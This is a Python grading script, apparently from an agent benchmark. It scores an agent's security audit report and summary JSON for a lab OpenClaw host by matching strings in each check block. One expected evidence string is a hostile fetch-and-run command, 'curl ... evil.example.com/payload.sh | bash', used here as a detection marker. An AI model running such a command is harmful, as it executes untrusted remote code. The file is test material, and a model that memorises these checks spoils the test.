import json
import os
import sys
import re

def read_file_text(path):
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as f:
            return f.read()
    except Exception:
        return None

def find_block(text, check_id):
    # Find the block starting at [CHECKID] and ending before the next line that starts with '[' or end of file
    marker = f"[{check_id}]"
    start = text.find(marker)
    if start == -1:
        return None
    # Determine end by finding the next occurrence of "\n[" after start
    next_idx = text.find("\n[", start + len(marker))
    if next_idx == -1:
        end = len(text)
    else:
        end = next_idx
    return text[start:end]

def block_has_status_vulnerable(block):
    if block is None:
        return False
    # Look for a line that starts with "Status: VULNERABLE"
    for line in block.splitlines():
        if line.strip().lower().startswith("status:"):
            return "vulnerable" in line.lower()
    return False

def evidence_contains(block, required_any=None, required_all=None):
    # required_any: list of strings, at least one must appear
    # required_all: list of strings, all must appear
    if block is None:
        return False
    b = block
    if required_all:
        for s in required_all:
            if s not in b:
                return False
    if required_any:
        if not any(s in b for s in required_any):
            return False
    return True

def main():
    workspace_root = sys.argv[1] if len(sys.argv) > 1 else "/root/.openclaw/workspace"
    input_dir = os.path.join(workspace_root, "input")
    output_dir = os.path.join(workspace_root, "output")
    reward_dir = os.path.join(workspace_root, "reward")

    checks = {
        "report_exists": False,
        "summary_json_valid": False,
        "summary_json_keys": False,
        "summary_json_toprisks_len3": False,
        "header_title_present": False,
        "header_host_secops_lab": False,
        "header_os_ubuntu": False,
        "header_kernel_515": False,
        "summary_section_present": False,
        "net_expose_vulnerable_with_evidence": False,
        "gw_auth_vulnerable_with_evidence": False,
        "ui_cswsh_vulnerable_with_evidence": False,
        "tool_policy_vulnerable_with_evidence": False,
        "skill_supply_vulnerable_with_evidence": False,
        "secret_storage_vulnerable_with_evidence": False,
        "file_perms_vulnerable_with_evidence": False,
        "persistence_vulnerable_with_evidence": False,
        "logs_vulnerable_with_evidence": False
    }

    report_path = os.path.join(output_dir, "openclaw_audit_report.txt")
    summary_path = os.path.join(output_dir, "summary.json")

    report_text = read_file_text(report_path)
    if report_text is not None:
        checks["report_exists"] = True

        # Header checks
        if "OPENCLAW SECURITY AUDIT REPORT" in report_text:
            checks["header_title_present"] = True
        if "Host: secops-lab" in report_text:
            checks["header_host_secops_lab"] = True

        # OS: ensure a line includes 'OS:' and 'Ubuntu' (but the reward summary only demands 'Ubuntu' presence)
        if "Ubuntu" in report_text:
            # Prefer to ensure it's tied to OS, but allow global inclusion to avoid false negatives
            checks["header_os_ubuntu"] = True

        # Kernel includes 5.15
        if "5.15" in report_text:
            checks["header_kernel_515"] = True

        # Summary section presence checks
        has_summary = ("SUMMARY" in report_text) and ("Total checks:" in report_text) \
                      and ("OK:" in report_text) and ("VULNERABLE:" in report_text) and ("UNKNOWN:" in report_text)
        if has_summary:
            checks["summary_section_present"] = True

        # Check blocks
        # NET-EXPOSE
        blk = find_block(report_text, "NET-EXPOSE")
        if block_has_status_vulnerable(blk) and evidence_contains(blk, required_any=["0.0.0.0:18789", "0.0.0.0:18792"]):
            checks["net_expose_vulnerable_with_evidence"] = True

        # GW-AUTH
        blk = find_block(report_text, "GW-AUTH")
        if block_has_status_vulnerable(blk) and evidence_contains(blk, required_all=["bind: 0.0.0.0", "auth: none"]):
            checks["gw_auth_vulnerable_with_evidence"] = True

        # UI-CSWSH
        blk = find_block(report_text, "UI-CSWSH")
        if block_has_status_vulnerable(blk) and evidence_contains(blk, required_all=["1.2.3", "gatewayUrl"]):
            checks["ui_cswsh_vulnerable_with_evidence"] = True

        # TOOL-POLICY
        blk = find_block(report_text, "TOOL-POLICY")
        if block_has_status_vulnerable(blk) and evidence_contains(blk, required_all=["exec", "requireApproval: false"]):
            checks["tool_policy_vulnerable_with_evidence"] = True

        # SKILL-SUPPLY
        blk = find_block(report_text, "SKILL-SUPPLY")
        if block_has_status_vulnerable(blk) and evidence_contains(blk, required_any=["curl | bash", "curl -s http://evil.example.com/payload.sh | bash"]):
            checks["skill_supply_vulnerable_with_evidence"] = True

        # SECRET-STORAGE
        blk = find_block(report_text, "SECRET-STORAGE")
        if block_has_status_vulnerable(blk) and evidence_contains(blk, required_all=["tokens.json"], required_any=["0644", "rw-r--r--"]):
            checks["secret_storage_vulnerable_with_evidence"] = True

        # FILE-PERMS
        blk = find_block(report_text, "FILE-PERMS")
        if block_has_status_vulnerable(blk) and evidence_contains(blk, required_all=["~/.openclaw"], required_any=["drwxrwxrwx", "0777"]):
            checks["file_perms_vulnerable_with_evidence"] = True

        # PERSISTENCE
        blk = find_block(report_text, "PERSISTENCE")
        if block_has_status_vulnerable(blk) and evidence_contains(blk, required_any=["unknown-skill-updater", "cron"]):
            checks["persistence_vulnerable_with_evidence"] = True

        # LOGS
        blk = find_block(report_text, "LOGS")
        if block_has_status_vulnerable(blk) and evidence_contains(blk, required_all=["203.0.113.5"]):
            checks["logs_vulnerable_with_evidence"] = True

    # summary.json checks
    summary_text = read_file_text(summary_path)
    if summary_text is not None:
        try:
            data = json.loads(summary_text)
            checks["summary_json_valid"] = True
            required_keys = {"totalChecks", "ok", "vulnerable", "unknown", "topRisks"}
            if isinstance(data, dict) and required_keys.issubset(data.keys()):
                checks["summary_json_keys"] = True
                tr = data.get("topRisks")
                if isinstance(tr, list) and len(tr) >= 3:
                    checks["summary_json_toprisks_len3"] = True
        except Exception:
            pass

    # Compute reward as fraction of checks passed
    total_checks = len(checks)
    passed = sum(1 for v in checks.values() if v)
    reward = passed / total_checks if passed > 0 else 0.0

    # Ensure zero reward if no relevant output files exist or nothing passed
    if not checks["report_exists"] and not checks["summary_json_valid"]:
        reward = 0.0
    if passed == 0:
        reward = 0.0

    result = {"reward": round(reward, 6)}
    result.update(checks)
    print(json.dumps(result))

if __name__ == "__main__":
    main()